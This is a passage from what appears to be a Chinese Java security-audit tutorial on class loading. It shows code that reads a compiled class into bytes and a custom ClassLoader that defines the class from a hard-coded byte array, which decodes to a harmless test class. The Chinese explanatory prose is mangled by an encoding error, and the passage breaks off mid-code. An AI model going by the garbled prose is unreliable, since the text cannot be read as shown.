æ–‡ä»¶ç”šè‡³æ˜¯è¿œç¨‹èµ„æºæ–‡ä»¶</p><p>ClassLoader å…·å¤‡äº†åŠ è½½ç±»çš„èƒ½åŠ›ï¼Œå¯ä»¥å°è¯•ä¸‹å†™ä¸€ä¸ªè‡ªå·±çš„ç±»åŠ è½½å™¨æ¥å®ç°åŠ è½½è‡ªå®šä¹‰çš„å­—èŠ‚ç ï¼ˆè¿™é‡Œä»¥åŠ è½½ <code>IndexJava</code> ç±»ä¸ºä¾‹ï¼‰å¹¶è°ƒç”¨ <code>test</code> æ–¹æ³•</p><p>å¦‚æœ <code>com.liangc.classloader.IndexJava</code> ç±»å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç å³å¯å®ç°è°ƒç”¨ <code>test</code> æ–¹æ³•å¹¶è¾“å‡º</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">IndexJava</span> indexJava <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IndexJava</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">String</span> str <span class="token operator">=</span> indexJava<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœ <code>com.liangc.classloader.IndexJava</code> æ ¹æœ¬å°±ä¸å­˜åœ¨äºæˆ‘ä»¬çš„ <code>classpath</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨é‡å†™ <code>findClass</code> æ–¹æ³•ï¼Œç„¶ååœ¨è°ƒç”¨ <code>defineClass</code> æ–¹æ³•çš„æ—¶å€™ä¼ å…¥ <code>IndexJava</code> ç±»çš„å­—èŠ‚ç çš„æ–¹å¼æ¥å‘ JVM ä¸­å®šä¹‰ä¸€ä¸ª <code>IndexJava</code> ç±»ï¼Œæœ€åé€šè¿‡åå°„æœºåˆ¶å°±å¯ä»¥è°ƒç”¨ <code>IndexJava</code> ç±»çš„ <code>test</code> æ–¹æ³•</p><ol><li>ç”Ÿæˆ <code>class</code> æ–‡ä»¶ <code>javac IndexJava.java</code> ï¼ˆè¿™é‡Œçš„ javac ç‰ˆæœ¬å’Œ java ç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œå³å…¨æ˜¯ 8 æˆ–è€…å…¨æ˜¯ 17 ç­‰ç­‰ï¼‰</li></ol><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileOS</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">GetContent</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">long</span> fileSize <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileSize <span class="token operator">></span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token class-name">FileInputStream</span> fi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> fileSize<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">int</span> numRead <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>offset <span class="token operator">&lt;</span> buffer<span class="token punctuation">.</span>length</pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>numRead <span class="token operator">=</span> fi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> buffer<span class="token punctuation">.</span>length <span class="token operator">-</span> offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            offset <span class="token operator">+=</span> numRead<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment">// ç¡®ä¿æ‰€æœ‰æ•°æ®å‡è¢«è¯»å–</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>offset <span class="token operator">!=</span> buffer<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"Could not completely read file "</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                    <span class="token operator">+</span> file<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        fi<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">return</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token class-name">FileOS</span> fileOS <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">fileOS<span class="token punctuation">.</span></span>GetContent</span><span class="token punctuation">(</span><span class="token string">"H:\\Object\\Java\\JavaSec\\classloader\\src\\com\\liangc\\classloader\\IndexJava.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è¿™é‡Œä¼ å…¥ class æ–‡ä»¶è·¯å¾„</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">byte</span> b <span class="token operator">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                bytes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ol start="2"><li>å¤åˆ¶åˆ°ä»£ç ä¸­</li></ol><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716164129546.png" title="image-20230716164129546"></p><ol start="3"><li>åˆ æ‰ IndexJava.java åè¿è¡Œä»£ç </li></ol><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.liangc.classloader.IndexJava"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token comment">// è°ƒç”¨ JVM çš„ native æ–¹æ³•å®šä¹‰ TestHelloWorld ç±»</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classContent<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classContent<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token class-name">Test</span> newLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 